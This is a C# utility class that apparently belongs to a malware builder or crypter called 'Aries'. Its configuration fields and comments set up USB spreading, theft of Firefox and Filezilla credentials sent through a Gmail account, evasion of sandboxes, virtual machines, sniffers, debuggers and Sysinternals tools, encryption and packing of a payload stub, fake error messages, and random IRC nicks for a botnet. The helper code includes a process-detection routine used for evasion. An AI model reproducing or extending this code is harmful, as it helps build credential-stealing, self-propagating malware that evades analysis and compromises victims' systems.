using System;
using System.Text;
using System.Runtime.InteropServices;

namespace Aries
{
    sealed class Util
    {
        /// <summary>
        /// Used to check the dll's loaded in the process (Anti Sniffer / sandboxie)
        /// </summary>
        /// <param name="lpModuleName">DLL to check for</param>
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);


        public static SimpleAES AESClass = new SimpleAES();
        public static string FSplit = "!_!";
        public static string FSplit2 = "X!@";
        public static string FSplit3 = "h0c";
        public static string FSplit4 = "GU0";


        ///<summary>Encryption key used for AES</summary>
        public static byte[] encryptionkey;


        //public static bool CheckSandboxAnti;
        ///<summary>Compress the target file?</summary>
        public static bool compressed;

        ///<summary>The target file contents, stored in a string</summary>
        public static string file1TargetFileOutput;

        ///<summary>string to store the stub in</summary>
        public static string stub;

        ///<summary>Spread to USB drives after running 1st time</summary>
        public static bool USBSpread;

        ///<summary>Anti Sniffers/Debuggers</summary>
        public static bool AntiSniffDebug;

        ///<summary>Send Firefox/Filezilla info after running 1st time</summary>
        public static bool SendFirefoxFilezilla;

        ///<summary>Gmail Username</summary>
        public static string GmailUser;

        ///<summary>Gmail Password</summary>
        public static string GmailPass;

        ///<summary>Body of the error msg to display if enabled</summary>
        public static string ErrorBody;

        ///<summary>Title of the error msg to display if enabled</summary>
        public static string ErrorTitle;

        ///<summary>Display the error msg if it's enabled and if running in a Virtual Environement</summary>
        public static bool DisplayInVirtual;

        ///<summary>Anti Sandboxie</summary>
        public static bool DisplayErrorMsg;

        ///<summary>Anti Sandboxie</summary>
        public static bool AntiSandbox;

        ///<summary>Anti Virtual Environment</summary>
        public static bool AntiVirtual;

        ///<summary>Encrypt the host file?</summary>
        public static bool EncryptHost;

        ///<summary>Numeric value for the way that the program will end itself</summary>
        public static int CrashType;

        ///<summary>Anti Sysinternals products</summary>
        public static bool AntiSysinternals;

        ///<summary></summary>
        public static string msgIcon;

        ///<summary></summary>
        public static string ProtectNum;

        ///<summary>Original size of the target file</summary>
        public static int OriginalSize;

        ///<summary>use a random irc nick</summary>
        public static bool UseRandomNick;

        public delegate void FormClosingEventHandler(object sender, System.Windows.Forms.FormClosingEventArgs e);

        public static int PackedSize;
        //End compression


        /// <summary>
        /// Check for a process name and window title
        /// </summary>
        /// <param name="file_name">Process or window title to check for</param>
        public static bool IsProcessRunning(string file_name)
        {
            foreach (System.Diagnostics.Process p in System.Diagnostics.Process.GetProcesses())
            {
                if (p.MainWindowTitle.Contains(file_name) || p.ProcessName.Contains(file_name))
                { return true; }
            }
            return false;
        }

        /// <summary>
        /// Reverse a string
        /// </summary>
        /// <param name="x">String to reverse</param>
        public static string Reverse(string x)
        {
            char[] charArray = new char[x.Length];
            int len = x.Length - 1;
            for (int i = 0; i <= len; i++)
                charArray[i] = x[len - i];
            return new string(charArray);
        }

        /// <summary>
        /// Return a string of random letters (removed numbers for more compatible use)
        /// </summary>
        /// <param name="length">Length of random string to return</param>
        public static string getRandNum(int length)
        {
            //string str = "0123456789"; //"!@#$%^&*()";
            string str2 = "abcdefghijklmnopqrstuvwxyz";
            //string str3;
            //str3 = (str + str2);
            Random random = new Random();
            StringBuilder builder = new StringBuilder(length);
            int i;
            for (i = 0; i <= length - 1; i++)
            {
                int num2 = random.Next(str2.Length);
                builder.Append(str2[num2]);
            }
            return Convert.ToString(builder);
        }
    }
}
